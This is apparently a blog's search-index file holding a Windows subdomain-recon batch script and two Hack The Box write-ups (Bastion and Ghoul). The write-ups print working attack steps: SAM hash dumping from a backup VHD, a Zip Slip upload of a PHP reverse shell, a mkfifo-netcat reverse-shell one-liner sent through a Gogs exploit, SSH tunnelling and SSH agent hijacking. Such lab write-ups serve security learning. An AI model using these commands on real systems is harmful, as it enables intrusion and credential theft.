var store = [{
        "title": "Eumeration for Windows",
        "excerpt":"Here at following a little batch script I created which could be usefull for subdomain discovering and enumeration. I really love CommandoVM so yea, why not developing a little lazyrecon for it ;) Enjoy!   @echo off echo       ############################ echo .             CommandoVM Recon         .  echo       ############################ echo ---------------------------------------- set year=%date:~-4% set month=%date:~3,2% set day=%date:~7,2% set @domain=%1 set @rootpath=%2 set assetfinder= C:\\Users\\Entropico\\go\\bin\\assetfinder.exe set aquatonepath= C:\\Tools\\Aquatone\\aquatone.exe set dnscan=  C:\\Tools\\dnscan\\dnscan.py set dnscan_wordlist= C:\\Tools\\SecLists\\Discovery\\DNS\\jhaddix-dns.txt set sublister= C:\\Tools\\Sublist3r\\sublist3r.py set amasspath= C:\\Tools\\Amass\\amass.exe set dirsearchpath=C:\\Tools\\dirsearch\\ set chromiumpath= C:\\Tools\\Aquatone\\chromium\\chrome.exe set waybackurlspath= C:\\Users\\Entropico\\go\\bin\\waybackurls.exe set httprobe= C:\\Users\\Entropico\\go\\bin\\httprobe.exe set python3 = C:\\Python38\\python.exe echo Starting the enumeration of %@domain% echo Creating Folder for %@domain% set saveresult=%@rootpath%\\%@domain%_%year%_%month% mkdir %saveresult% echo Amass is running... %amasspath% enum -d %@domain% -o %saveresult%\\amass.txt --passive echo Amass Done echo Sublist3r is running... python %sublister%  -d \"%@domain%\" -b -o %saveresult%\\sublist3r.txt -v echo Sublist3r Done echo DNScan is running... python %dnscan%  -d %@domain% -w %dnscan_wordlist% -o %saveresult%\\dnscan.txt -R 8.8.8.8 -r awk  '/%@domain%/{print $3}' %saveresult%\\dnscan.txt | tail -n+2 &gt; %saveresult%\\dnscan_clean.txt rm %saveresult%\\dnscan.txt echo DNScan Done echo AssetFinder is running... %assetfinder%  %@domain%  &gt; %saveresult%\\assetfinder.txt echo AssetFinder Done echo Merging all subdomains found... cat  %saveresult%\\* | sort | uniq &gt; %saveresult%\\final_subdomain_list.txt echo HTTProbe is running... cat %saveresult%\\final_subdomain_list.txt | %httprobe%  &gt; %saveresult%\\final_online_subdomains_temp.txt cat   %saveresult%\\final_online_subdomains_temp.txt  | sed \"s/\\http\\:\\/\\///g\" |  sed \"s/\\https\\:\\/\\///g\" | sort | uniq &gt; %saveresult%\\final_online_subdomains.txt rm %saveresult%\\final_online_subdomains_temp.txt echo HTTProbe Done echo WayBackURLS is running... cat %saveresult%\\final_online_subdomains.txt | %waybackurlspath% -dates -no-subs &gt; %saveresult%\\waybackurls.txt echo WayBackURLS Done echo Aquatone Enumerate %@domain% echo Starting Aquatone... cat %saveresult%\\final_online_subdomains.txt | %aquatonepath% -ports medium -scan-timeout 10000 -out %saveresult%\\aquatone-report -screenshot-timeout 6000 -chrome-path %chromiumpath% echo Aquatone Done echo Performing Dirsearch... %python3% %dirsearchpath%dirsearch.py -L %saveresult%\\aquatone-report\\aquatone_urls.txt -e * echo Done ! Save every result in %saveresult%  ","categories": [],
        "tags": [],
        "url": "http://localhost:4000/BugBounty/EnumerationForWindows/",
        "teaser":null},{
        "title": "Over The Wire Abbondanza 2019",
        "excerpt":"cane  ","categories": [],
        "tags": [],
        "url": "http://localhost:4000/CTF/OverTheWireAbbondanza2019/",
        "teaser":null},{
        "title": "Get some fractals done :)",
        "excerpt":" ","categories": [],
        "tags": [],
        "url": "http://localhost:4000/Graphic/GetSomeFractalsDone/",
        "teaser":null},{
        "title": "Adversarial Transplantation",
        "excerpt":"cane  ","categories": [],
        "tags": [],
        "url": "http://localhost:4000/MachineLearning/AdversarialTransplantation/",
        "teaser":null},{
        "title": "Some DnB",
        "excerpt":" ","categories": [],
        "tags": [],
        "url": "http://localhost:4000/Music/Amazing%20DnB/",
        "teaser":null},{
        "title": "Bastion",
        "excerpt":"USER   The first thing we have done has been to perform an Nmap scan against the target.   nmap -sS -sV -v -A -p- -oA nmap_tcp_all 10.10.10.134  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC    As it is possible to notice the only interesting ports are SMB ports. For this reason we tried to use smbmap with guest account, through the following command :   smbmap -H 10.10.10.134 -u guest -p \"\" -R      As it is possible to observe the result is quite interesting because we can freely access to the Backup folder of the SMB server. Trying to download large files has revealed to be slow so we tried so we tried to mount the smb share on our box, using the following command:   mount //10.10.10.134/Backups ./vhd/ -o user=guest   Unfortunately the command does not work properly, apparently the File System is CIFS and mount need a further module, cifs-utils. After having installed the module, we could access the SMB share running:   mount //10.10.10.134/Backups ./vhd/ -o user=guest   Enumerating the share locally, we can notice a WindowsImageBackup folder, which could potentially contain some interesting backup files. Reaching the following folder WindowsImageBackup/L4mpje- PC/Backup 2019-02-22 124351 is possible to notice some xml and Windows Disk Image files.      The first try is to mount that image file. We need to find a tool which allows us to mount vhd image files, because Kali doesn’t support it natively.   sudo apt-get install libvhdi-utils sleuthkit vhdimount 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd /root/Documents/HTB/Bastion/smb/vhd_mount/   In this way we create a device vhd1 in the selected folder, creating a Boot-Sector for mounitng the Windows Image Disk. At this step , simply trying to mount the device returns an error, declaring that NTFS signature is missing. Analysing the vhdi1 using mmls shows that the NFS partition does not start from the beginning of the file, but from 0000000128.      Using this information is possible to calculate the offset, which is 128*512 (sector length) = 65536. Rewriting the commands brings to:   mount -vt ntfs-3g -o ro,noload,offset=65536 /.vhdi1 ./backup/   And we were able to mount the partition in the backup folder. Looking at the backup, it is clear that it contains the whole Windows OS, including the configuration files. Indeed, it is possible to access to the folder /Windows/System32/config and have access to SYSTEM and SAM files, which are needed in order to dump the hashes of the users.      Using john specifying the NT format is possible to crack the password of user L4mpje. Administrator::500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: L4mpje:bureaulampje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec9 86d9::: Using the discovered credential over ssh allows to open a session as user L4mpje, obtaining the first flag.      ROOT   Now we need to get superuser privileges. As first, we need to enumerate the Windows FS, searching for interesting files. Unofrtunately the systeminfo command is denied, so I tried to access the same information using powershell, verifying if I obtain a different result. And so it was, we were able to identify the current OS version using Get-ComputerInfo.      In order to have a complete overview of the files and programs installed on the comuter, I also run the Powerless [1] enumeration script. The output is present as Appendix. Digging into the listed files, we noticed a non-standard application installed under Program Files (x86)  mRemoteNG. Googling it we discovered that it is a manager for remote connections for different communications protocols [2]. So it could likely contains usefull credentials, hopefully of the Administrator user, granting us full control over the box. Further researching for possible ways to recovery the password, I found an interesting article [3]. Despite it proposes three different ways in order to recover it, the only one actually working for me is the first one, which involves installing mRemoteNG in a Windows system. The file which contains the credential we are searching for is under Users\\L4mpje\\AppData\\Roaming  mRemoteNG\\confCons.xml which contains two nodes, so probably, two encrypted credentials.      After having started a Windows VM and having installed mRemoteNG on it, I modified the confCons.xml file in order to set a blank password for opening the file and loaded it using mRemoteNG on my VM. The file is successfully loaded and the program shows two connectins : DC and L4mpje. Using the password lookup tool of mRemoteNg, we are able to check the credentials of both user, finding a new password.      Providing this as password for user Administrator over ssh opens up an ssh session, so are have finally owned the box. We can take the last flag and say bye bye to Bastion :P      References   [1] : https://github.com/M4ximuss/Powerless   [2] : https://mremoteng.org   [3] : http://hackersvanguard.com/mremoteng-insecure-password-storage/  ","categories": ["HTB"],
        "tags": [],
        "url": "http://localhost:4000/htb/bastion/",
        "teaser":null},{
        "title": "Ghoul",
        "excerpt":"USER   As usual we always start with Nmap scanning:   root@pentestbox:~# nmap -sC -sV -oA ghoul 10.10.10.101  PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA) |_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA) 80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: A64A06AAE4304C2B3921E4FA5C9FF39C | http-methods:  |_  Supported Methods: POST OPTIONS HEAD GET |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Aogiri Tree 2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA) |   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA) |_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519) 8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1 | http-auth:  | HTTP/1.1 401 Unauthorized\\x0D |_  Basic realm=Aogiri |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 - Error report    Due to the fact that there doesn’t seems to be nothing really interesting on the website on port 80 and that the one on port 8080 is protected from a basic authentication, I run gobuster on port 80.    /root/go/bin/gobuster dir -u http://10.10.10.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -o gobuster --timeout 30s  /index.html (Status: 200) /images (Status: 301) /blog.html (Status: 200) /contact.html (Status: 200) /archives (Status: 301) /uploads (Status: 301) /users (Status: 301) /css (Status: 301) /js (Status: 301) /secret.php (Status: 200) /less (Status: 301) /server-status (Status: 403)   This reveals an interesting page, secret.php. It shows a chat between system admins  talking about an RCE on the current infrastructure.      Due to the fact that the enumeration didn’t show anything else interesting here I swapped port and went to port 8080. I then tried admin:admin and it worked, revealing a website for uploading images or zip files on the server.      After a few tests in which I verified that it is not possible to easily evade the file-type filters of the upload form I searched a bit on google and I found the Ziplib vulnerability (https://github.com/snyk/zip-slip-vulnerability). This vulnerability allows to write arbitrary files because the zip archives contains directory traversal filenames.   The main Idea is then to being able to upload a php reverse shell on the webserver using this vulnerability. I took then the reverse.php from kali and created a set of folders with depth 5 - just to being sure to reach the / folder of the target system- in order to run the following command:    zip ziplib_www.zip ../../../../../var/www/html/rev.php      Once uploaded the ziplib_www.zip file using the upload form, connecting to http://10.10.10.101:80/rev.php returns a reverse shell on our netcat listener.      Enumerating the box, I noticed that there are three users with a login: eto,kaneki and noro. LinEnum.sh shows up interesting backup files under the folder /var/backups . After having downloaded the whole directory using a meterpreter session and figured out that most of the files are rabbit holes I focused only on the directory /var/backups/backups/keys, which contains three old ssh private keys of the three users. Unfortunately all these keys are encrypted so I had to find a way to decrypt those. I tried then to use JTR , converting the ssh keys using ssh2john script:    python /root/Documents/cryptography/JohnTheRipper/run/ssh2john.py kaneki.backup   After multiple failures using rockyou for cracking the three of them, I decided to use cewl on the secret.php page in order to create an alternative wordlist.   cewl http://10.10.10.101/secret.php &gt; cewl.txt  And finally I got it cracked!      The ssh decryption password for kaneki ssh is ILoveTouka and I am finally able to login as kaneki.  Got user !   ROOT   The first thing to notice are two notes present into the home folder of kaneki:   note.txt :Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts  notes : I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc. DM me for the access.  These are interesting because they make me understand two things:  first , there is another vulnerability to exploit around, probably usefull for privesc, and second, that we are into a virtualized network, specifically a Docker container - we can notice the file .dockerenv in the / folder.   Indeed, looking at ifconfig:      So apparently there is an internal network 172.20.0.0/24 and we need to explore it. Indeed, after uploading nmap and having run:   nmap -p-  172.20.0.0-255  Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-05 14:40 UTC Unable to find nmap-services!  Resorting to /etc/services Cannot find nmap-payloads. UDP payloads are disabled. Nmap scan report for Aogiri (172.20.0.1) Host is up (0.00026s latency). Not shown: 1204 closed ports PORT     STATE SERVICE 22/tcp   open  ssh 80/tcp   open  http 8080/tcp open  http-alt  Nmap scan report for Aogiri (172.20.0.10) Host is up (0.00028s latency). Not shown: 1204 closed ports PORT     STATE SERVICE 22/tcp   open  ssh 80/tcp   open  http 8080/tcp open  http-alt  Nmap scan report for 64978af526b2.Aogiri (172.20.0.150) Host is up (0.00030s latency). Not shown: 1206 closed ports PORT   STATE SERVICE 22/tcp open  ssh  Enumerating more the whole FileSystem and searching for tomcat configuration files, which could contain interesting credentials, I found the following file: /usr/share/tomcat7/conf/tomcat-users.xml which contains a commented line :    user username=\"admin\" password=\"test@aogiri123\" roles=\"admin\"   Maybe it would be usefull later on. So it is clear that we have a new host in the network. Reading inside the .ssh folder of kaneki user I noticed a new ID of the current user:   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7TXpXNf2anZ/02E0NRVKuSWVslhHaJjUYtdtBVxCJg+wv1oFGPij9hgefdmFIKbvjElSr+rMrQpfCn6v7GmaP2QOjaoGPPX0EUPn9swnReRgi7xSKvHzru/ESc9AVIQIaeTypLNT/FmNuyr8P+gFLIq6tpS5eUjMHFyd68SW2shb7GWDM73tOAbTUZnBv+z1fAXv7yg2BVl6rkknHSmyV0kQJw5nQUTm4eKq2AIYTMB76EcHc01FZo9vsebBnD0EW4lejtSI/SRC+YCqqY+L9TZ4cunyYKNOuAJnDXncvQI8zpE+c50k3UGIatnS5f2MyNVn1l1bYDFQgYl kaneki_pub@kaneki-pc ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@Aogiri  Acknoweldging that we are currently into the Aogiri host, guess drives me to say that probably 172.20.0.150 is kaneki-pc.  I tried then to use the current private ssh key present into the ssh folder of kaneki to connect to the remote host:   kaneki@Aogiri:~/.ssh$ ssh -i id_rsa kaneki_pub@172.20.0.150  Using the same password as before .. and it worked, I am in! I noticed then another text file:   to-do.txt : Give AogiriTest user access to Eto for git.  This means that there is a git repo somewhere on one of these hosts, which could contain interesting info. Moreover, looking at ifconfig, I noticed that this box is connected to a new subnet,172.18.0.0/24:      In order to upload nmap also on this box, I used an ssh tunneling:   ssh -L 9000:172.20.0.150:22 -i ./Backups/kaneki.backup  kaneki@10.10.10.101 scp -P9000 -i id_rsa ./nmap kaneki_pub@127.0.0.1:/tmp  And in this way I have been able to successfully upload nmap to kaneki-pc ( 172.20.0.150 ).   kaneki_pub@kaneki-pc:/tmp$ ./nmap -p- 172.18.0.0-255  Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-06 13:14 GMT Unable to find nmap-services!  Resorting to /etc/services Cannot find nmap-payloads. UDP payloads are disabled. Nmap scan report for Aogiri (172.18.0.1) Host is up (0.00023s latency). Not shown: 65530 closed ports PORT      STATE SERVICE 22/tcp    open  ssh 80/tcp    open  http 2222/tcp  open  unknown 8080/tcp  open  http-alt 10007/tcp open  unknown  Nmap scan report for cuff_web_1.cuff_default (172.18.0.2) Host is up (0.00028s latency). Not shown: 65533 closed ports PORT     STATE SERVICE 22/tcp   open  ssh 3000/tcp open  unknown - HTTP  Nmap scan report for kaneki-pc (172.18.0.200) Host is up (0.00030s latency). Not shown: 65534 closed ports PORT   STATE SERVICE 22/tcp open  ssh   As it is possible to observer, there is a new host ,172.18.0.2, with ssh and http open on port 3000. In order to check what  is present on that server, I had to tunnel again over ssh, using this time the existing tunnel already present.   ssh -L 9100:172.18.0.2:3000 -i id_rsa  kaneki_pub@localhost -p 9000   And we can see a login screen of Gogs.      After enormous time spent bruteforcing the credentials I just tried to use all users and passwords already found on the box and I finally found the right combination.   AogiriTest:test@aogiri123      From a previous note we know there is a vulnerability on gogs so google is our best friend here.. And I found this coll github repo with Poc : https://github.com/TheZ3ro/gogsownz. So mainly we are able to obtain a RCE on gogs. Let’s try to obtain a reverse shell!   After having uploaded netcat through scp :    scp -P9000 -i id_rsa ./ncat kaneki_pub@127.0.0.1:/tmp  and having started a local listener we run the following command:   python3 gogsownz.py http://127.0.0.1:9100/ -C 'AogiriTest:test@aogiri123' --rce 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 172.18.0.200 8000 &gt;/tmp/f'  --cleanup  And I am git on 172.18.0.2!      Enumerating the system I noticed that there is only one user except root, which git, which seems mandatory for Gogs. This seems pointless so go on with enumeration! Let’s try with classical Linux enumeration files using  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ Running enumeration for SUID binaries we see something interesting:   /usr/bin/passwd /usr/bin/gpasswd /usr/bin/chage /usr/bin/chfn /usr/bin/chsh /usr/bin/newgrp /usr/bin/expiry /usr/sbin/gosu /bin/su     So just running:   gosu root bash  allows to become root.   Going into the /root folder I can see interesting information:      So we have new credentials :   kaneki:12345ILoveTouka!!!   I tried to log in into Gogs with those but there is only a gogstest report, totally empty and useless. Lets focus on the other file: aogiri-app.7z After having downloaded it locally:   chmod 777 aogiri-app.7z cp aogiri-app.7z /tmp ncat -l -p 1234 -q 1 &gt; aogiri-app.7z&lt; /dev/null → on 172.18.0.200 cat aogiri-app.7z | nc 172.18.0.200 1234 → on 172.18.0.2 scp -P9000 -i id_rsa kaneki_pub@127.0.0.1:/tmp/aogiri-app.7z  ./aogiri-app.7z   I started looking at it closely. It is a git repository. Really interesting. It seems that initially I found some creds but unfortunately useless :(   /src/main/resources# cat application.properties  server.port=8080 spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db spring.datasource.username=kaneki spring.datasource.password=jT7Hr$.[nF.)c)4C server.address=0.0.0.0  spring.jpa.properties.hibernate.dialect = org.hibernate.dialect.MySQL5InnoDBDialect spring.jpa.hibernate.ddl-auto = validate  spring.servlet.multipart.enabled=true spring.servlet.multipart.file-size-threshold=2KB spring.servlet.multipart.max-file-size=200MB spring.servlet.multipart.max-request-size=215MB  As first we can look at it using common git commands, as log, show,branch etc.. but those are rabbit holes. Indeed, looking at the git logs we can see that there  is a remote git repository !   logs/refs/heads/master:0000000000000000000000000000000000000000 8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 kaneki &lt;kaneki@aogiri.htb&gt; 1546062314 +0530    commit (initial): update readme logs/refs/heads/master:8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 bec96aaf334dc0110caa163e308d4e2fc2b8f133 kaneki &lt;kaneki@aogiri.htb&gt; 1546062622 +0530    commit: updated dependencies logs/refs/heads/master:bec96aaf334dc0110caa163e308d4e2fc2b8f133 51d2c360b13b37ad608361642bd86be2a4983789 kaneki &lt;kaneki@aogiri.htb&gt; 1546062722 +0530    commit: added readme logs/refs/heads/master:51d2c360b13b37ad608361642bd86be2a4983789 ed5a88cbbc084cba1c0954076a8d7f6f5ce0d64b kaneki &lt;kaneki@aogiri.htb&gt; 1546062881 +0530    commit: mysql support logs/refs/heads/master:813e0a518064778343ba54b64e16ad44c19900fb b3752e00721b4b87c99ef58e3a54143061b20b99 kaneki &lt;kaneki@aogiri.htb&gt; 1546063447 +0530    commit: noro stop doing stupid shit logs/refs/heads/master:b3752e00721b4b87c99ef58e3a54143061b20b99 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &lt;kaneki@aogiri.htb&gt; 1546063698 +0530    commit: added service logs/refs/heads/master:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &lt;kaneki@aogiri.htb&gt; 1546064090 +0530    commit: update dependencies logs/refs/heads/master:0d426b533d4f1877f8a114620be8a1294f34ab71 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &lt;kaneki@aogiri.htb&gt; 1546064281 +0530    reset: moving to HEAD^ logs/refs/heads/master:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &lt;kaneki@aogiri.htb&gt; 1546064622 +0530    reset: moving to 0d426b5 logs/refs/heads/master:0d426b533d4f1877f8a114620be8a1294f34ab71 b3752e00721b4b87c99ef58e3a54143061b20b99 kaneki &lt;kaneki@aogiri.htb&gt; 1546064718 +0530    reset: moving to b3752e0 logs/refs/heads/master:b3752e00721b4b87c99ef58e3a54143061b20b99 b43757dbbefdb3af3966fbd5ca273496180dc913 kaneki &lt;kaneki@aogiri.htb&gt; 1546064792 +0530    commit: added mysql deps logs/refs/heads/master:b43757dbbefdb3af3966fbd5ca273496180dc913 647c5f1a2f95e117244d9128bff7a579ca1d4968 kaneki &lt;kaneki@aogiri.htb&gt; 1546065100 +0530    commit: changed service logs/refs/remotes/origin/master:0000000000000000000000000000000000000000 98ecb8ad40e3d47029bfecd3e356d4b880d835e3 kaneki &lt;kaneki@aogiri.htb&gt; 1546062361 +0530   pull: storing head logs/refs/remotes/origin/master:98ecb8ad40e3d47029bfecd3e356d4b880d835e3 8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 kaneki &lt;kaneki@aogiri.htb&gt; 1546062429 +0530   update by push logs/refs/remotes/origin/master:8b7452057fc35b5bd81a0b26a4bd2fe1220ab667 bec96aaf334dc0110caa163e308d4e2fc2b8f133 kaneki &lt;kaneki@aogiri.htb&gt; 1546062643 +0530   update by push logs/refs/remotes/origin/master:bec96aaf334dc0110caa163e308d4e2fc2b8f133 51d2c360b13b37ad608361642bd86be2a4983789 kaneki &lt;kaneki@aogiri.htb&gt; 1546062735 +0530   update by push logs/refs/remotes/origin/master:51d2c360b13b37ad608361642bd86be2a4983789 ed5a88cbbc084cba1c0954076a8d7f6f5ce0d64b kaneki &lt;kaneki@aogiri.htb&gt; 1546062891 +0530   update by push logs/refs/remotes/origin/master:813e0a518064778343ba54b64e16ad44c19900fb b3752e00721b4b87c99ef58e3a54143061b20b99 kaneki &lt;kaneki@aogiri.htb&gt; 1546063465 +0530   update by push logs/refs/remotes/origin/master:b3752e00721b4b87c99ef58e3a54143061b20b99 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &lt;kaneki@aogiri.htb&gt; 1546063708 +0530   update by push logs/refs/remotes/origin/master:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &lt;kaneki@aogiri.htb&gt; 1546064105 +0530   update by push logs/refs/remotes/origin/master:0d426b533d4f1877f8a114620be8a1294f34ab71 e29ad435b1cf4d9e777223a133a5b0a9aaa20625 kaneki &lt;kaneki@aogiri.htb&gt; 1546064304 +0530   update by push logs/refs/remotes/origin/master:e29ad435b1cf4d9e777223a133a5b0a9aaa20625 0d426b533d4f1877f8a114620be8a1294f34ab71 kaneki &lt;kaneki@aogiri.htb&gt; 1546064632 +0530   update by push logs/refs/remotes/origin/master:0d426b533d4f1877f8a114620be8a1294f34ab71 b43757dbbefdb3af3966fbd5ca273496180dc913 kaneki &lt;kaneki@aogiri.htb&gt; 1546064802 +0530   update by push logs/refs/remotes/origin/master:b43757dbbefdb3af3966fbd5ca273496180dc913 647c5f1a2f95e117244d9128bff7a579ca1d4968 kaneki &lt;kaneki@aogiri.htb&gt; 1546065107 +0530   update by push  Looking at the configurations, this remote has been hosted by gogs , probably a while ago and we cannot access it anymore. The only hope is that some crucial information has been stored into git objects. Git objects can be found under .git/objects folder and they are zlib files. Luckily for us, stackoverflow will help ! https://stackoverflow.com/questions/3178566/how-to-deflate-with-a-command-line-tool-to-extract-a-git-object   printf \"\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\" | cat - .git/objects/c0/fb67ab3fda7909000da003f4b2ce50a53f43e7 | gunzip → this works!  So start trying all the the git objects one by one, taking note for eventual new password appearing, suddenly I got something…        /.git/objects/41# printf \"\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\" | cat - * | gunzip | strings  gzip: stdin: unexpected end of file blob 476 server.port=8080 spring.datasource.url=jdbc:mysql://localhost:3306/db spring.datasource.username=root spring.datasource.password=g_xEN$ZuWD7hJf2G   Tried the new password everywhere… Nein!   gzip: stdin: unexpected end of file blob 478 server.port=8080 spring.datasource.url=jdbc:mysql://localhost:3306/db spring.datasource.username=kaneki spring.datasource.password=7^Grc%C\\7xEQ?tb4 server.address=0.0.0.0  And the new password… works! We are able to become root on 172.20.0.150   su : pasword 7^Grc%C\\7xEQ?tb4     … Ok so we are root on the 172.18.0.200, the only host that is still untouched is the docker server on 172.20.0.1. Maybe on the filesystem there are some info for connect to it. Run enumeration, nothing. Lets try conjobs, just run pspy64 and wait a while. And finally something weird happened:      It seems that some other host is passing through this host to reach 172.18.0.1 for a root session on it…interesting After a bit of googling I got my answer:   https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking/   So I can Hijack the SSH session. I just need to be fast.   SSH_AUTH_SOCK=/tmp/ssh-e6wtZlMHTY/agent.1061 ssh root@172.18.0.1 -p 2222  finally root…    Who ate the Ghoul ? Thank you for reading this write-up. Feedback is appreciated! Happy hacking :)   ","categories": ["HTB"],
        "tags": [],
        "url": "http://localhost:4000/htb/ghoul/",
        "teaser":null}]
